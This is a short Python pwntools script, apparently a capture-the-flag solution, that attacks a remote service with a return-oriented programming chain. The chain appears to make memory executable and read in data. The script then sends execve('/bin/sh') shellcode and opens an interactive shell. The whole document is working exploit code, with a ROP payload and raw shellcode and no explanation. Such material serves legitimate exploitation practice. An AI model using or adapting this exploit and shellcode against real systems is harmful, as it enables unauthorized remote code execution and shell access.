from pwn import *

p = remote("remote.goatskin.kr", 12333)
payload = ""

for i in range(10) :
    payload += p64(0x400699)

payload += p64(0x400696)
payload += p64(0x400000)
payload += p64(0x400698)
payload += p64(0x1000)
payload += p64(0x40069a)
payload += p64(0x7)
payload += p64(0x400590)
payload += p64(0x400696)
payload += p64(0x0)
payload += p64(0x400698)
payload += p64(0x400750)
payload += p64(0x40069a)
payload += p64(0x200)
payload += p64(0x400550)
payload += p64(0x400750)
p.recvuntil("\n")
p.sendline(payload)
p.recvuntil("bye:P\n")
payload2 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.sendline(payload2)
p.interactive()
